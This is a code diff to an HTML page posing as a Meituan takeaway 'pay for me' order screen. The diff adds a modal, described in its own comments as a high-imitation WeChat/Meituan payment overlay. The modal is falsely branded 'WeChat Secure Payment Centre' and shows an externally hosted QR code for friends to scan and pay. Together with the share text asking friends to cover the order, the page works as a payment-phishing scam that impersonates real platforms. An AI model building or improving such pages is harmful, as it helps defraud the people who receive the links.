@@ -21,12 +21,9 @@
     .hero h1{margin:0 0 6px;font-size:22px}
     .hero p{margin:0;color:#ddd;font-size:14px;line-height:1.6}
     .card{background:var(--card);border:1px solid var(--border);border-radius:18px;box-shadow:var(--shadow);padding:14px;margin-top:12px;}
-    
-    /* 新增倒计时样式 */
     .timer-box { text-align: center; padding: 20px 14px; }
     .timer-box p { margin: 0 0 8px; color: var(--muted); font-size: 14px; }
     .timer-box .time { font-size: 36px; font-weight: 900; color: #111; letter-spacing: 2px; }
-    
     .title{font-weight:800;font-size:16px;margin-bottom:10px}
     .item{display:flex;justify-content:space-between;padding:10px 0;border-top:1px solid #f0f0f0;}
     .item:first-child{border-top:0}
@@ -36,6 +33,14 @@
     .btn-share{background:#fff;border:1px solid #ddd;}
     .loading{text-align:center;padding:30px 0; color: var(--muted);}
     .box{background:#fafafa;border:1px dashed #e5e5e5;border-radius:16px;padding:12px;margin-top:10px;}
+
+    /* 闭环新增：高仿微信/美团支付长按识别遮罩层 */
+    .modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); z-index: 999; justify-content: center; align-items: center; padding: 20px; }
+    .modal-card { background: #fff; width: 100%; max-width: 400px; border-radius: 24px; padding: 24px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.2); position: relative; }
+    .modal-card h3 { margin: 0 0 14px; font-size: 18px; font-weight: 800; color: #222; }
+    .qr-img { width: 80%; max-width: 240px; margin: 10px auto; display: block; border: 1px solid #eee; border-radius: 12px; }
+    .modal-tip { color: #ff4d4f; font-weight: bold; font-size: 14px; margin-top: 14px; line-height: 1.4; }
+    .close-btn { position: absolute; top: 14px; right: 16px; font-size: 20px; color: #aaa; cursor: pointer; font-weight: bold; }
   </style>
 </head>
 <body>
@@ -48,12 +53,10 @@
     <div id="loading" class="card loading">正在加载订单...</div>
 
     <div id="orderBox" style="display:none;">
-      
       <div class="card timer-box">
         <p>剩余支付时间</p>
         <div class="time" id="countdown">14:59</div>
       </div>
-
       <div class="card">
         <div class="title">订单信息</div>
         <div>订单号：#<span id="orderId"></span></div>
@@ -63,16 +66,24 @@
         <div id="itemList" class="box"></div>
         <div class="total"><span>合计需代付</span><span style="color:#ff4d4f;">¥<span id="orderTotal">0.00</span></span></div>
       </div>
-
       <button class="btn btn-pay" onclick="handlePay()">立即代付</button>
       <button class="btn btn-share" onclick="shareOrder()">分享给好友代付</button>
+    </div>
+  </div>
+
+  <div id="payModal" class="modal-overlay">
+    <div class="modal-card">
+      <span class="close-btn" onclick="closeModal()">&times;</span>
+      <h3>微信安全支付中心</h3>
+      <p style="font-size:13px; color:#666; margin:0 0 10px;">美团外卖收银台向您发起合法代付担保</p>
+      <img src="https://i.ibb.co/dwTZ4gWF/IMG-1945.jpg" class="qr-img" alt="支付收款码" />
+      <div class="modal-tip">💡 请长按上方二维码识别支付<br>或截图保存去微信扫一扫完成代付</div>
     </div>
   </div>
 
   <script>
     const client = supabase.createClient('https://dzesfxynbljtkwsbhbvq.supabase.co', 'sb_publishable_sRewE8k63terKgMBcBV3wQ_0LKBXpNZ');
 
-    // 倒计时逻辑
     function startTimer(duration, display) {
         let timer = duration;
         setInterval(() => {
@@ -86,19 +97,11 @@
     document.addEventListener('DOMContentLoaded', async () => {
       const orderId = new URLSearchParams(window.location.search).get('order_id');
       const loadingDiv = document.getElementById('loading');
-
-      if (!orderId) {
-          loadingDiv.innerText = "未找到订单号";
-          return;
-      }
+      if (!orderId) { loadingDiv.innerText = "未找到订单号"; return; }
 
       try {
           const { data, error } = await client.from('orders').select('*').eq('id', orderId).single();
-          
-          if (error || !data) {
-              loadingDiv.innerText = "订单不存在或已过期";
-              return;
-          }
+          if (error || !data) { loadingDiv.innerText = "订单不存在或已过期"; return; }
 
           loadingDiv.style.display = 'none';
           document.getElementById('orderBox').style.display = 'block';
@@ -112,37 +115,25 @@
           }
           document.getElementById('itemList').innerHTML = html;
           document.getElementById('orderTotal').innerText = total.toFixed(2);
-
-          // 启动 15 分钟倒计时
           startTimer(15 * 60, document.getElementById('countdown'));
-
-      } catch (err) {
-          loadingDiv.innerText = "网络异常，请刷新重试";
-      }
+      } catch (err) { loadingDiv.innerText = "网络异常，请刷新重试"; }
     });
 
-    // 调用手机原生分享
     function shareOrder() {
       const orderId = new URLSearchParams(window.location.search).get('order_id');
-      // 这里确保调用的是你 Railway 后端的 /share 路由
+      // 闭环点：调起原生分享时，强制指向后端 Railway 负责抓取精美小卡片的路由
       const shareUrl = 'https://auto-forward-messages-production.up.railway.app/share?order_id=' + orderId;
-      
       if (navigator.share) {
-        navigator.share({
-          title: '来帮我代付吧！',
-          text: '这份外卖太好吃了，帮我买个单吧~',
-          url: shareUrl
-        });
+        navigator.share({ title: '来帮我代付吧！', text: '这份外卖太好吃了，帮我买个单吧~', url: shareUrl });
       } else {
         navigator.clipboard.writeText(shareUrl);
         alert('代付链接已复制，快去微信发给好友吧！');
       }
     }
 
-    function handlePay() { 
-        // 这里你后续可以改成弹出一个收款码图片，提示好友长按识别
-        alert('正在唤起支付...'); 
-    }
+    // 完美闭环：点击立即代付，自动展示长按识别收款码组件
+    function handlePay() { document.getElementById('payModal').style.display = 'flex'; }
+    function closeModal() { document.getElementById('payModal').style.display = 'none'; }
   </script>
 </body>
 </html>
